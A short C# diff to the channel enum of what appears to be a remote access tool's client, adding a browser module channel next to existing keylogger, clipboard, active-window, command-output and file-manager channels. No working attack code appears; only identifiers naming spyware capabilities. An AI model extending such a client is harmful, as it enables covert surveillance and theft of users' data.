@@ -4,7 +4,7 @@ namespace Client.Conexion
 {
     public enum Channel : byte
     {
-        Main = 0, // Canal principal para comandos y respuestas
+        Main = 0, 
         Keylogger = 1,
         ActiveWindow = 2,
         Clipboard = 3,
@@ -15,8 +15,8 @@ namespace Client.Conexion
         CommandOutput = 8,
         FileManager = 9,
         ServerFileUpload = 10,
-        KeyExchange = 11
-
+        KeyExchange = 11,
+        BrowserModule = 12
     }
     public static class Protocol
     {
